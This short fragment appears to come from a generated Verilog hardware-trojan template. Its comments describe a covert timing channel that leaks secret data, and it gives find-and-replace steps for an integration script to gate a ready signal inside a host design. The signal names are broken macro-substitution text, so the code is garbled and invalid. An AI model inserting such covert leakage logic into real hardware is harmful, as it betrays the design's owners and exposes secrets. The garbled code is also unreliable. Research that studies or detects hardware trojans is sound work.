 ...
 * Payload: Modulate timing of `PS_PL_CTRL_QUEUE_DATA_BIT_SIZE-1:0 based on secret data
 * 
...
assign secret_bit = `PS_PL_CTRL_QUEUE_DATA_BIT_SIZE-1:0[0];
...
// ============================================================
// Covert Channel: Modulate timing of `PS_PL_CTRL_QUEUE_DATA_BIT_SIZE-1:0
//
// Integration Script Must Modify:
//
// IF `PS_PL_CTRL_QUEUE_DATA_BIT_SIZE-1:0 is timing-sensitive:
//   Find: assign `PS_PL_CTRL_QUEUE_DATA_BIT_SIZE-1:0 = ready_signal;
//   Replace: assign `PS_PL_CTRL_QUEUE_DATA_BIT_SIZE-1:0 = (timing_delay == 0) ? ready_signal : 1'b0;
//
